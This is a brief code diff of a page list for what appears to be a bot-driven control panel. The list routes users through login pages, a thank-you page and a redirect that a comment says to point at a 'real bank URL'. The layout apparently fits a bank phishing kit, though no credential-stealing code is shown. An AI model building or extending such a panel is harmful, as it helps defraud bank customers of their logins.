@@ -26,7 +26,7 @@ PAGES = [
     {"emoji": "🔑", "text": "LOGIN2", "page": "login2.html"},
     {"emoji": "🎉", "text": "THANK YOU", "page": "thnks.html"},
     # Special button for external redirect
-    {"emoji": "🌐", "text": "GO TO SITE", "page": "redirect:https://www.google.com"},  # Change to real bank URL if needed
+    {"emoji": "🌐", "text": "GO TO SITE", "page": "redirect_site"},
 ]
 
 # Removed set_webhook() call from startup – do it manually once after first deploy
